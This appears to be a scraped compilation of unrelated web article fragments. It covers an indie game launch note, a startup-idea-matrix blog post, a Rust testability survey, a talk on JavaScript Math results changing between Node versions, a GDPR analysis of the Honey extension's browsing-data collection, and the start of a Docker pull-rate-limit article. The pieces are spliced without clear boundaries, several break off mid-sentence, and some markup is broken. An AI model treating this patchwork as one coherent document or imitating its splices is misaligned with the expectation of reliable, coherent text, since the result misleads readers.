On Friday I followed through on that youthful dream and shipped Asterogue, yay!</p>
<p>This game won’t sell. I have been around the indie games scene long enough to know its a crap-shoot. To make a successful indie game you have to execute at peak performance, do everything right, and then you still roll the dice on success. I’ve seen stone cold geniuses build glorious works of art and watch them get zero downloads. A single tear rolls down their cheek one week after launch and tiny pixellated violins play a chiptune version of Mozart’s Requiem.</p>
<p>My game won’t sell and that’s ok. I am at peace with it after all of these years of game jams and side projects. It is the way of things. I’m just happy to have had the chance to fulfill this dream.</p>
<p>I had so much fun making Asterogue. I’ve never worked harder on a side project. I publically committed to an October 30th release, and I’ve done it. I built the thing I dreamed of making since I was a kid, and I am simply grateful to the universe that this opportunity was within my reach.</p>
<p>I want to thank the people who took a chance and bought the game. It’s amazing to me that our tiny club of people who like this kind of game has more than one member. You guys rock!</p>
<p>I also want to thank from the bottom of my heart the people who tested the game and gave me feedback. It’s an honor when somebody is willing to sacrifice their time to try out something you built, and I really appreciate it. It’s your feedback that made this the best possible game I could make in the time allocated. Thank you.</p>

<h2><a name="startup"></a>Startup Idea Matrix by Eric Stromberg</h2>
<p><span>Ideas are the new currency of the 21st century. Sometimes they are more valuable than money.</span></p>
<p><span>For example, the&nbsp;well-known story of&nbsp;Mark Zuckerberg turning down Yahoo’s offer of $1 billion. He would’ve made $250 million, but rejected it in ten minutes’ time. As Peter Thiel put it: ideas were more valuable to Mark than money.</span></p>
<p><span>However, there is always the question of how to create good ideas, sell them and negotiate the highest value for them. Eric Stromberg (head of Google Play) has made up the Startup Idea Matrix that, as he claims, “outlines various consumer markets as well as tactics a company can take to bring a unique product to the market”.</span></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/1-1Bo_yGSLXbylNKFn4u1JJg-min-2.png" alt="" width="1200" height="662"></p>
<p><strong><a href="https://docs.google.com/spreadsheets/d/1k5sTdMpWKvPIqUi1UNIKQ8xBpw5DEyRfwnAQxZoHmDw/edit?usp=sharing" target="_blank" rel="noopener noreferrer">Follow this link to view the full B2C matrix</a></strong></p>
<p><strong><a href="https://docs.google.com/spreadsheets/d/1xafwdQyWczCwPDGsGoiCSe8SdlbgN-QHjktLemqRo7s" target="_blank" rel="noopener noreferrer">Follow this link to view the full B2B matrix</a></strong></p>
<p><span>Anyone can look through it and get some inspiration and, what is more important, ideas for the startup not only on the Internet but also in the offline business.</span></p>
<p><span>Ideas are given in the columns of the table, and the consumer markets are shown in the rows with the well-known examples in between.</span></p>
<p><a name="ideas"></a>The author of the matrix notes that it is very prudent to be patient in finding your business idea, market, or opportunity.</p>
<h2>Ideas are more valuable than money</h2>
<p><span>As you can see, in nowadays reality, simple ideas are the basis for the success of many companies. For example, Instagram has created a photo service only for smartphones. Nowadays 1 billion people use Instagram every month. </span></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/insta_2020.jpg" alt="" width="427" height="619"></p>
<p><span>The founder of Evernote Stepan Pachikov has decided to transfer an offline activity into an online one by creating a web service and software set for making and storing notes. In just 5 years, there were 65 million Evernote users. Or the most spread tactic – making a paid product free – has helped Udacity, Coursera and EdX to make a revolution in education by providing free online courses for everyone. That’s not the whole list! And anyone can take a cue from these companies and fill the empty cells!</span></p>
<blockquote><p><i><span>“Think of this less as a map and more as a starting point for creativity.” – Eric Stromberg</span></i></p></blockquote>
<p><span>At the beginning of the article, we gave an example showing that certain ideas are more valuable than money. &nbsp;Guess why? Well, e</span><span>veryone lo</span><span>ves a good rags-to-riches story! A brilliant yet simple idea is behind each and every such story! Need proof?</span></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/1200px-Facebook_New_Logo_2015.svg_-1.png" alt="" width="1200" height="451"></p>
<p><span>The very same Zuckerberg being a student came up with the idea of a “hot or not” type of website called Facemash. It was the first step in his journey to the well-known Facebook. Zuckerberg is now worth over $35 billion.</span></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/google-new-logo-2015-1.jpg" alt="" width="1200" height="700"></p>
<p><span>Students are very inventive! Just like Facebook, Google was also created during the college years. Larry Page and Sergey Brin came up with the idea of a unique search engine. Now Google has more than $66 billion in sales and continues to grow by developing the other businesses. Page and Brin are now each worth almost $30 billion.<img src="https://s-pro.io/blog/wp-content/uploads/2017/06/amazon_logo_RGB-1.jpg" alt="" width="1250" height="458"></span></p>
<p><span>But don’t even think that only students can become billionaires. Jeff Bezos was working at a Wall Street firm before he realized that he wanted to launch his own online bookstore. Now Amazon sells everything you can think of. It’s worth about $200 billion with over $88 billion in annual sales. Bezos is now worth over $150 billion.</span><a name="blue"></a></p>
<h3><span><br>
<a href="#review">Check-list: review your startup idea for validity</a></span></h3>
<h2>Blue Ocean strategy</h2>
<p><span>Need something else&nbsp;for inspiration? Well, there is a great book “Blue Ocean Strategy” by W. Chan Kim and Renée Mauborgne. You should definitely read it, it will be a great investment in yourself. The approach that is described in this book is very simple: to create something new all you need to do is just mix two spheres or two working ideas. You can do it endlessly.</span></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/blue-ocean-strategy.jpg" alt="" width="785" height="368"></p>
<p><span>So using this approach in the ideas matrix described above, you can generate tons of options. But do not forget to validate the ideas before launching them!</span></p>
<p><span>The second simple approach this book suggests taking the existing solution and improve it. Of course, </span><span>you’ll plunge into the world of competition and of a constant race for victory, but if you are really good at what you do and run well in front of your competitors – go ahead!</span></p>
<p>And the last point of this strategy: by challenging the traditional view of who can and should be the target customer, a brand often finds new ways to offer the customer the desired value. For example, consider how Canon copiers created the small desktop copier industry by targeting users rather than corporate buyers.</p>
<p><span>We can continue listing the famous companies that have had&nbsp;a huge success with one simple idea. Moreover, using these matrixes anyone can develop their own idea and fill the empty cells in these tables! In addition, they may help you analyze the profit that certain ideas can bring and the most demanded niches that are starving for tasty ideas.</span><a name="brainstorm"></a></p>
<h2>How to brainstorm startup ideas: techniques and tools</h2>
<p>Brainstorming new business ideas can be done either on your own or in a group. The goal is to create as many ideas as possible, which can be analyzed in detail for their viability and compliance with your life goals.<br>
Here are 6 techniques to help you productively brainstorm new startup ideas.</p>
<p><strong>1. Define your motivation</strong><br>
Let’s say you want to build a hobby-based business. Or organize a lifestyle that depends on your geographic location. Or make your part-time employment full-fledged with a stable large income. Next, answer the question: what business will help you achieve this personal goal? Create a table and in the first column write the goals and the ideas of the business leading to their achievement in the second. Based on this you can build your idea matrix.</p>
<p><strong>2. Imagine you have unlimited time and money</strong><br>
Usually, we discard bold thoughts because we’re mindful of the lack of resources and the present conditions of life. The brain has a natural tendency to quickly judge and discard business ideas and identify them as stupid and untenable. While conducting brainstorming startup ideas, try to fantasize without limits, opening up to meet all the potential ideas as if you have everything in abundance. Think boldly and big: if you could build any business, what would it be?</p>
<p>Write down all the ideas in your startup matrix, no matter how crazy or ghostly they may seem. The secret is that the craziest thoughts can lead to other, more realistic ideas.</p>
<p><strong>3. Spend time in your client’s shoes</strong><br>
It’s a mistake to make a decision about launching a startup based only on the opinion of business owners. It’s important to understand the point of view of potential customers, and only those ideas for startups that take into account the needs and pains of the target audience will find a response. To get a better understanding of your consumer’s world, you can make a survey or conduct deep research, which will help to test your hypotheses. Also, you should trace all the points of consumer’s interaction with your product/service such as marketing, sales, purchases, technical support. By looking at this contact through the eyes of your target audience, you can generate many ideas to improve the customer experience.</p>
<p>It’s important to understand a startup in the context of its use from all sides. A specific using case will give you a simple, linear vision of this process.</p>
<p><strong>4. Building a business idea matrix: describe your target market</strong><br>
Brainstorming around the specifics of targeted markets leads to interesting ideas about the characteristics of the future product. We would advise you to create a cloud of associations that describe the behaviour and traits of your consumer. This will help you to see how you can improve your startup.</p>
<p><strong>5. Quantity is more important than quality</strong><br>
Remember that brainstorming is just a field for generating ideas. This creative thinking process isn’t aimed at evaluating ideas for validity. The task of the moderator is to manage the brainstorming participants to share all their thoughts.</p>
<p><strong>6. No criticism, including constructive and professional</strong><br>
In brainstorming, it is important to be able to “turn off” your background, professional point of view, and fears. These are all limiting factors at this stage. The step-by-step and rigid structure of brainstorming can also limit thinking. Vice versa, bursts of creativity can play into your hands.</p>
<p><em><strong>Use these tools to build your startup idea matrix</strong></em></p>
<p>Don’t ignore the tools that will enhance your creativity. You will need the following things to help you capture your ideas and evaluate them against different criteria:</p>
<ul>
<li><strong>Notebook.</strong> Capture and store all ideas in one place. All developments will be at hand, they’ll be able to stimulate the birth of new ideas in the future. Also, you can return to them after brainstorming.</li>
<li><strong>Colouring markers.</strong> The use of different colours is important both for the aesthetic component of brainstorming and for systematization and differentiation of ideas.</li>
<li><strong>Whiteboard or flipchart.</strong> Especially important in the case of group brainstorming. You want to get enough room so as not to save space in the creative process.</li>
<li><strong>Adhesive stickers.</strong> Their advantage is that they can be moved to other surfaces.<br>
You will get a flexible map of your creative process.</li>
<li><strong>Recorder.</strong> Formulate the thought out loud before writing it down on a notebook or on a whiteboard. Discussing your ideas with your partner helps to concretize the direction of your thinking, stimulates the emergence of derivative ideas.</li>
</ul>
<p>Of course, after brainstorming, the real work begins: auditing the industry, communicating with clients, studying its history, and understanding weak points to validate an idea.</p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/Brainstorming_process.jpg" alt="" width="827" height="574"></p>
<h2><a name="important"></a>Why is it so important to validate a startup idea?</h2>
<p>So, let’s say you successfully did brainstorming and got some startup ideas at the end. What’s next? Are you ready to throw all your energy and resources into starting a new business?</p>
<p>Wait, there is one more …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>What can we do when designing Rust code to make it easier to test?
This is a survey of everything I could find<sup id="fnref:survey-method" role="doc-noteref"><a href="#fn:survey-method">1</a></sup> about
testing Rust with a particular focus on design for testability for
correctness.  Some of the articles show multiple things to do on a
worked example, some are more focused on a particular trick.</p>

<p>There doesn’t seem to be a single place that describes all the testing
ideas: it is scattered across book chapters, blog articles, medium
articles, etc. but here are the main sources that I have found.</p>

<ul>
  <li><a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">The Rust book</a> chapter on testing</li>
  <li><a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing command line applications in Rust</a>
(significant overlap with the <a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>)</li>
  <li><a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a>

</ul>

<p>I am not going to try to summarize what these sources say: the rest of
this post is a list of some common / interesting topics and which of
these sources describe it in more detail.</p>

<p>Although my main focus is on how to write Rust programs so that they are easy
to test, I touch on the other half of the problem: how to do the testing.</p>

<p><em>[I am new to Rust and my own testing habits are somewhat ad-hoc so this is
definitely not a recommendation of how to write software by me.  I hope it is
useful and that you will tell me what I have missed
<a href="https://twitter.com/alastair_d_reid">on twitter</a> or
<a href="mailto:alastair.d.reid@gmail.com">by email</a>
so that I can update this post.
I would love to hear about any team that has published recommendations for
design-for-testability.]</em></p>

<p>The sources listed above have a bunch of common suggestions that I
explore in more detail below. Many of the sources I found have great
discussions so I will not try to repeat their explanations in this
document but will link to some of the better discussions of each idea
that I found.</p>

<a href="https://blog.logrocket.com/using-the-rust-compiler-as-your-integration-testing-framework/">use the Rust compiler for integration testing</a></p>

<ul>
  <li>Use intermediate data structures to separate deciding what to do
from performing the action: allowing tests to check that the right
decision is being made and avoiding the need to mock/fake the
filesystem, etc.</li>
  <li>Aggressively use newtypes, structs, enums</li>
  <li>Parse and validate inputs early (eg convert strings to enums)</li>
  <li>Also, #[must_use], parse/validate early</li>

  <li>All randomized testing systems should be fully deterministic
and easily reproducible</li>
  <li>Beware of additional randomness in libraries:

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>This is a written version of a talk that I gave at <a href="https://wafflejs.com/">WaffleJS</a> in February, which itself was an expansion of a <a href="https://twitter.com/tmcw/status/1187782634623000576">Twitter conversation</a> from October.</em></p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.webp" type="image/webp"><img alt="Math education" src="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.jpg"></picture></p><p>Okay, so it starts with my delayed math education. As part of my Computer Science program, I had access to world-class math professors, access that I mostly wasted. I didn’t like math: the topics were so removed from practice, and I was already frustrated by the highly theoretical, and – I thought at the time and mostly still do – out-of-touch CS program.</p><p>Unfortunately, a few years after graduating, I got the hunger for math. Seeing how I could apply just a little bit of math knowledge to great effect in my work &amp; hobbies had me inspired. But I had no clear way of learning it.</p><p>So I <a href="https://macwright.com/2012/06/26/simple-statistics.html">started Simple Statistics in 2012</a> as a way to learn math, and ever since then, I’ve expanded and maintained the project. It now includes a lot of different algorithms, is one of the most ‘starred’ JavaScript math projects, and presumably is used by people.</p><p>But I started it in 2012. In tech years that’s a really long time ago. Between then and now, there have been 8 LTS releases of <a href="https://nodejs.org/en/">Node</a>. JavaScript and its environments have radically changed. 2012 was before the introduction of React or the first commit to Babel.</p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.webp" type="image/webp"><img alt="Time passing" src="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.jpg"></picture></p><p>So what I noticed over the years was that tests kept breaking when I updated Node. I’d have a test like:</p><div><div><pre><code><span>t</span><span>.</span><span>equal</span><span>(</span><span>ss</span><span>.</span><span>gamma</span><span>(</span><span>11.54</span><span>),</span> <span>13098426.039156161</span><span>);</span>
</code></pre></div></div><p>That would work in Node v10 and break in Node v12. And this is not some complex method: gamma is implemented with arithmetic, Math.pow, Math.sqrt, and Math.sin.</p><h3 id="arithmetic">Arithmetic</h3><p>So I know what you might be thinking: arithmetic. JavaScript, on Twitter, gets a lot of heat for this behavior:</p><div><div><pre><code>0.1 + 0.2 = 0.30000000000000004
</code></pre></div></div><p>As I wrote in <a href="https://macwright.com/2017/07/29/javascript-wats-dissected.html#numbers-are-weird">JavaScript wats, dissected</a>, this is the behavior of every popular programming language, even stodgy pedantic ones like Haskell. Floating point arithmetic might be weird, but it’s very consistent and well-specified: the <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE 754</a> specification is rigorously implemented. So it’s not arithmetic: addition, subtraction, division, and multiplication are pretty set in stone.</p><h3 id="math">Math</h3><p>What it was, was Math. In particular, all of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math">the methods that come after <code>Math.</code></a></p><p>Methods like Math.sin, Math.cos, Math.exp, Math.pow, Math.tan: <a href="https://macwright.com/2013/03/05/math-for-pictures.html">essential ingredients for geometry</a> and basic computation. I started isolating changes in basic function behavior between versions. For example:</p><p>Calculating Math.tanh(0.1)</p><div><div><pre><code>// Node 4
0.09966799462495590234
// Node 6
0.09966799462495581907
</code></pre></div></div><p>Calculating Math.pow(1/3, 3)</p><div><div><pre><code>// Node 10
0.03703703703703703498
// Node 12
0.03703703703703702804
</code></pre></div></div><p>To make matters worse, it’s not just Node’s behavior that’s changing: so are browsers and other places you use JavaScript.</p><p>So this led to the question: <strong>what is math?</strong></p><svg fill="none" viewBox="0 0 1105 572" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h1105v572H0z" fill="#fff"></path><path d="M551.933 460.719c92.311 0

coordinates on the rim, and that they’ll draw little squigglies if plotted on X &amp; Y. Actually <em>deriving</em> those methods is what you’ll learn in advanced classes, but the method that you use - the <a href="https://en.wikipedia.org/wiki/Taylor_series">Taylor series</a> - relies on an <em>infinite</em> series, which would be rather laborious for a computer to solve.</p><blockquote><p>“There is no standard algorithm for calculating sine. IEEE 754-2008, the most widely used standard for floating-point computation, does not address calculating trigonometric functions such as sine.”</p></blockquote><p>-<a href="https://en.wikipedia.org/w/index.php?title=Sine&amp;oldid=939445047#Software_implementations">Wikipedia</a></p><p>Computers use a variety of different estimations and algorithms to do math, things like <a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> and various cheating algorithms and lookup tables. This heterogeny explains all of the <a href="https://github.com/search?q=fastmath">‘fastmath’</a> libraries you can find on GitHub: there’s more than one way to implement Math.sin. Famously, Quake III Arena used a <a href="https://en.wikipedia.org/w/index.php?title=Fast_inverse_square_root&amp;oldid=940101226">faster replacement for the inverse square root method</a> in order to speed up rendering.</p><p>So math is implemented as algorithms, and there are multiple common algorithms –&nbsp;and variations of those algorithms –&nbsp;used in practice.</p><p>Instead of telling implementations to pick an algorithm, the JavaScript specification grants them a <em>lot</em> of wiggle room in terms of how they implement these basic functions.</p><blockquote><p>The behaviour of the functions acos, acosh, asin, asinh, atan, atanh, atan2, cbrt, cos, cosh, exp, expm1, hypot, log,log1p, log2, log10, pow, random, sin, sinh, sqrt, tan, and tanh is not precisely specified here except to require specific results for certain argument values that represent boundary cases of interest.</p></blockquote><p>-<a href="https://www.ecma-international.org/ecma-262/10.0/index.html#sec-function-properties-of-the-math-object">ECMA-262, 10th edition, section 20.2.2 aka “JavaScript”</a></p><p>I don’t know the inner workings of the standards committees, but I imagine they wanted to make sure that just in case Intel or AMD introduce super-fast new math instructions in a new processor, JavaScript wouldn’t have a compatibility crisis.</p><p>Because there are a lot of JavaScript interpreters that are commonly used, because JavaScript is often used via web browsers and there still is some competition between web browsers, and because even popular JavaScript implementations are under pressure to evolve quickly to be the most performant…&nbsp;because of all that, this matters. You actually will encounter, on a regular basis, differences in math.</p><p>This doesn’t matter as much in other interpreted languages, because they tend to have ‘canonical’ interpreters: most of the time you use the Python interpreter of the Python language.</p><h3 id="where-math-happens">Where math happens</h3><p>Next let’s zoom into <em>where</em> these math implementations live. See, in JavaScript, there are three places where basic math can happen:</p><ol><li>The CPU</li><li>The language interpreter (the C++ and C code that underlies JavaScript implementations)</li><li>In software itself, as a library</li></ol><p><strong>1: The CPU</strong></p><p>This was my first guess: I assumed that since CPUs implement arithmetic, they might implement some higher-level math. It turns out that CPUs do have instructions to do trigonometry and other operations, but they’re rarely invoked. The CPU (x86) implementation of sine doesn’t get much love because it’s not reliably faster than an implementation in software (using arithmetic operations on the CPU), nor as accurate.</p><p>Intel also bears some blame for <a href="https://randomascii.wordpress.com/2014/10/09/intel-underestimates-error-bounds-by-1-3-quintillion/">overstating the accuracy of their trigonometric operations</a> by many magnitudes. That kind of mistake is especially tragic because, unlike software, you can’t patch chips.</p><p><strong>2: The language interpreter</strong></p><p>This is how most of the implementations do it, and they implement math in a variety of ways.</p><ul><li>V8 &amp; SpiderMonkey use (slightly different) ports of the <a href="http://www.netlib.org/fdlibm/">fdlibm</a> library for most operations. It has been passed down through the generations, originally written at Sun Microsystems.</li><li>JavaScriptCore (Safari) uses cmath for most operations.</li><li>Internet Explorer used some cmath, but <a href="https://github.com/microsoft/ChakraCore/blob/d86452259dd534718b7eb9ce024ed35aefd33036/lib/Runtime/Library/MathLibrary.cpp#L1028-L1047">also used some assembly instructions and actually <em>did</em> use CPU-provided trig methods</a> when it was compiled for CPUs that had them.</li></ul><p>Historically, all of these implementations have shifted: V8 used to use a homegrown solution for math, and then used <a href="https://github.com/v8/v8/blob/ff7975aa8d1ff6f0904f0f5112d17ea819466983/src/math.js">a port of fdlibm to JavaScript</a>, before finally settling on fdlibm in C.</p><h3 id="why-this-is-an-issue">Why this is an issue</h3><p>Here’s why this is a problem: it chips away at JavaScript’s ability to give consistent results to any problem including mathematics. And that especially hits <em>data science</em>. I want JavaScript to be a contender for data science in the browser, and – amongst some other issues, like number types and a confounding lack of a commonly-used data-frames library –&nbsp;an inability to produce replicable results means adding more crisis to the <a href="https://en.wikipedia.org/wiki/Replication_crisis">replication crisis</a> in the sciences.</p><h3 id="the-third-way">The third way</h3><p>There is a way out that we can use today. <a href="https://github.com/stdlib-js/stdlib">stdlib</a> is a JavaScript library that reimplements higher-level math using arithmetic alone. Arithmetic is fully-specified and standard, so the results that stdlib gives you are also fully consistent, across all the platforms.</p><p>This comes at the cost of complexity and speed: stdlib isn’t consistently as fast as built-in methods, and you’ll need to require a library ‘just’ to compute sine.</p><p>But in the wider view, this is pretty normal! WebAssembly, for example, doesn’t give you higher-level math methods at all and recommends you include a math implementation in your modules themselves:</p><blockquote><p>“WebAssembly doesn’t include its own math functions like sin, cos, exp, pow, and so on. WebAssembly’s strategy for such functions is to allow them to be implemented as library routines in WebAssembly itself (note that x86’s sin and cos instructions are slow and imprecise and are generally avoided these days anyway).”</p></blockquote><p>And this is the way that compiled languages have always worked: when you compile a C program, the methods you import from <code>math.h</code> are included in the compiled binary.</p><h3 id="using-an-epsilon">Using an epsilon</h3><p>If you don’t want to include stdlib to do math but you do want to test math-heavy code, you’ll probably have to do what simple-statistics does right now: use an epsilon. Of the <a href="https://en.wikipedia.org/w/index.php?title=Epsilon&amp;oldid=938802001#Symbol">5+ uses of epsilon in math</a>, the one I’m referring to is “an arbitrarily small positive quantity”. It’s a tiny number. Here’s <a href="https://github.com/simple-statistics/simple-statistics/blob/727eaed049af4f788fb2299e5c8263573618e78c/src/epsilon.js#L35">simple-statistics’s implementation</a>: the number 0.0001.</p><p>You then compare <code>Math.abs(result - expected) &lt; epsilon</code> to make sure you got within range of the desired value, with a little bit of wiggle room.</p><h3 id="the-moral-of-the-story">The moral of the story</h3><p>Here’s where I was a little short on time in person and have some room to expand.</p><p><em>First, what’s under the hood is rarely what you expect.</em> Our current tech stack is heavily optimized and a lot of optimizations are really just dirty tricks. For example, the number of hardware instructions it takes to solve <code>Math.sin</code> varies based on the input, because there are lots of special cases. When you get to more complex cases, like ‘sorting an array’, there are often multiple algorithms that the interpreter chooses between in order to give you your final result. Basically, the cost of anything you do in an interpreted language is variable.</p><p><em>Second, don’t trust the system too much.</em> What I was seeing between Node versions really <em>should</em> have been a bug in the testing library, or something in my code, or maybe in simple-statistics itself. But in this case, digging deeper revealed that what I was seeing was exactly what you don’t expect: a glitch in the language itself.</p></div></div>

November 3, 2020 | https://www.datarequests.org/blog/honey-data-collection/ | <a href="https://web.archive.org/web/*/https://www.datarequests.org/blog/honey-data-collection/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><strong>The free browser extension “Honey” wants to save their users money by automatically finding and applying coupon codes. They describe themselves as advocates for data protection and allegedly only collect history data on online shopping websites. Two of our members who have used Honey in the past, have asked for access to the data saved on them using the GDPR. Our analysis of the responses shows that Honey collects history data on a large scale, contrary to what their own privacy policy says. Thus, we have submitted complaints with the data protection authorities.</strong></p><p>“Stop wasting money – Honey helps you find some of the best coupon codes on 30,000+ sites.” That’s how Honey describe themselves on their homepage. The free browser extension is heavily advertised on YouTube and other websites. The idea behind it is nothing new. There have been websites that collect coupon codes for various online shops for a long time.</p><p>But Honey goes one step further and wants to make this process easier for their users. Sometimes, the coupon codes found on such websites are expired or only work for certain items. Trying the different coupons codes, that are often spread across many websites, can genuinely be quite frustrating. Honey promises to do that work for their users. Once installed in the browser, the addon automatically enters all coupons it knows on the shopping cart pages of supported websites. Afterwards, it applies the one that yields the biggest savings.</p><p>Honey then earn money through so-called “affiliate marketing”. The participating shops pay a commission to Honey for the coupons used.</p><p>So far, so good. But as a non-profit promoting data protection, we are mostly interested in one thing: How does Honey process their users’ data? As a browser extension, Honey could in theory record all internet traffic and thus log the entire browser history. This is especially problematic as Honey is run by a US company, <a href="https://www.datarequests.org/company/joinhoney/">Honey Science LLC</a>, that was recently <a href="https://help.joinhoney.com/article/302-what-does-honey-joining-paypal-mean-for-members">bought by PayPal</a>.</p><p>To find out what data Honey collects, we could first take a look at their privacy policy (and, of course, <a href="#honey-privacy-policy">we did</a>). But these unfortunately tend to be pretty general. They don’t really give users an idea on what data is actually collected on them. Luckily, the GDPR can help here. It grants users <a href="https://www.datarequests.org/blog/your-gdpr-rights/">extensive rights with regards to their data</a>. One of those is the so-called <em>right to data access</em>, which is defined in Art. 15 GDPR, and allows all consumers to demand a copy of the data companies have saved on them. This makes it possible to verify a company’s statements.</p><p>Two of our members, Benni and Malte, have made use of this right. They had both used the Honey extension in the past for a while. Benni had created an account and used that to log into the extension, while Malte has used the extension without an account. Both used our <a href="https://www.datarequests.org/generator/">generator</a> to send an access request to Honey.</p><p>We have then analysed the responses they received.</p><p>When logged into the extension with an account, accessing the data was very easy. The response containing the data arrived within a little more than two weeks. It contained various CSV files on different topics. The first couple contained details that one would expect: the data from the user profile, country and language, the <em>Honey Gold</em> balance, a list of transactions qualifying for Honey Gold, the IP addresses and browsers used at the time of registering for an account and installing the extension.</p><p>However, it also contained a file called <code>PageViews.csv</code> that was a lot more surprising. As the name implies, this file contains a list of page views. For Benni, who used the extension from mid February 2020 to mid May 2020, it contained a staggering 2591 entries.</p><p>To give an example, one of the lines in the file looks like this (displayed as a column here for better readability):</p><p>We can see: <strong>For every visit of a page in an online shop, Honey logs at least the following information</strong>: a timestamp, multiple <strong>unique IDs</strong> for user, session and device, the operation system, the browser and browser version, geolocation details, and the <strong>full URL of the visited page</strong>.<br>From that, the company gains an incredibly detailed insight into the shopping behaviour of its users. It knows not only the products that users buy but also all the products that they looked at but ultimately didn’t end up buying, as well as how long they looked at the product page.</p><p>We consider even this processing to be excessive. But it may be possible to barely justify it given that Honey’s purpose is to find coupon codes for the products that users look at. But Honey collects <em>a lot</em> more data.</p><p>Indeed, not only product pages from online shops are logged. Instead, Honey saves any visit to a page whose domain the company has classified as an “online shopping website”. But many shopping websites don’t just include the actual product pages. They often have a multitude of other content, like blog posts or login pages.<br>And Honey goes even further yet: They log page views even for subsites that are on different subdomains. Thus, the user’s browsing habits on countless forums, support pages and other sites are also documented. And for all of these pages, the full URL is saved, even including the document fragment that may allow reconstructing the precise position of the page the user looked at. The logged URLs and included parameters can also contain sensitive data but in any case they allow Honey to get a detailed view into the users’ browsing habits.</p><p>To demonstrate the scope of the profiles that Honey could create from this data, we have selected a few rows from Benni’s data export and will now describe what information could be inferred from this. The exact raw data of the corresponding rows is published below.</p><p>Honey knows, that on February 13, 2020 at 2:57 PM, Benni looked at an <a href="https://www.ifixit.com/Guide/Nintendo+Wii+DVD+Drive+Lens+Replacement/4491">iFixit guide</a> on how to swap the DVD lens on a Wii. He viewed the details for his AliExpress order <code>3002876007952992</code> a total of 13 times, starting on February 17 at 7:43 PM. He started a dispute for this order on February 25 at 10:01 AM. But before that, he went looking for an Airbnb in Berlin-Mitte on February 24 at 8:02 PM. He was looking for an entire accommodation or a hotel room for two adults for the period from March 04 to March 05. On March 01 at 6:46 PM, he looked at an <a href="https://support.apple.com/en-us/HT204306">Apple support page</a> describing how to reset an iPhone if you forgot the unlock code. The next day at 2:25 PM, he was interested in the <a href="https://creativecommons.org/licenses/by/4.0/">CC-by license</a> by Creative Commons and on March 10 at 9:04 PM, he looked at the <a href="https://developer.microsoft.com/en-us/fabric">Fabric UI Framework</a> by Microsoft. He is apparently also a member of a Microsoft family, as he added another member to his family the next day at 7:45 PM to share the benefits of his Office 365 subscription with them. On March 14 at 11:49 AM, he read an <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2018-1000136-electron-nodeintegration-bypass/">article</a> on a security vulnerability in the Electron framework. On March 23 at 5 PM, he watched the documentary <a href="https://curiositystream.com/video/1984/scanning-the-pyramids">“Scanning The Pyramids”</a> via the streaming provider CuriosityStream. He signed up for the service only half an hour earlier, at 4:29 PM, having been recruited by YouTuber Tom Scott and registering via his affiliate link. On March 25 at 6:51 PM, he was again interested in a trip, this time via FlixBus. He planned the trip as a one-way trip between Berlin and Leipzig for an adult on May 01. But this trip never took place, as there are no further entries for FlixBus. On April 22 at 8:33 AM, Benni redeemed a game on Steam with the code <code>5HGP6-JVK5C-I92YW</code>. On May 11 at 9:04 PM, he then informed himself about the lack of support for exporting in the MKV format in Adobe Premiere on the <a href="https://community.adobe.com/t5/premiere-pro/premiere-pro-cc-doesn-t-support-mkv-anymore/td-p/10586989?page=1">Adobe support forum</a>. He has an AWS account and access to the S3 bucket named <code>dacdn-static</code>. This contains a file with the path <code>talks/subtitles/20200511-okl-berlin-en.vtt</code>, which he looked at on May 13 at 3:09 PM.</p><p><strong>Honey can infer all this information directly from the data they collected.</strong> And the examples we gave only represent a tiny fraction of the information that Honey has. The 27 lines that the examples are based on, only make up just over 1&nbsp;% of the entries Honey has collected on Benni. We have focussed on non-product related page views. But in addition, Honey also knows every product that Benni looked at while he had installed the extension. Further, they could use the data they have for even more conclusions and profiles. For example, they could infer sleep cycles from the timestamps or build interest profiles based on the sites that were visited.</p><div><summary>Raw data as saved by Honey for the events described above</summary><pre>ts,timestamp,store,extension,product,src,sub_src,user_id,device_id,visitor_id,session_id,platform,version,referrer_url,first_referrer_url,language,campaign,location,os,browser,group,is_logged_in,client_ts

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As someone who is working with Docker Container images, you came across the new Docker Hub pull rate limit or perhaps you are already here because you encountered the error message <code>You have reached your pull rate limit</code> and are now looking for a solution on how to resolve it.</p><div><pre><code data-lang="sh">  
docker pull wordpress:latest  
  
Error response from daemon: pull access denied <span>for</span> wordpress, repository does not exist or may require ‘docker login’:   
denied: You have reached your pull rate limit. You may increase the limit by authenticating and upgrading: https://www.docker.com/increase-rate-limit  
  
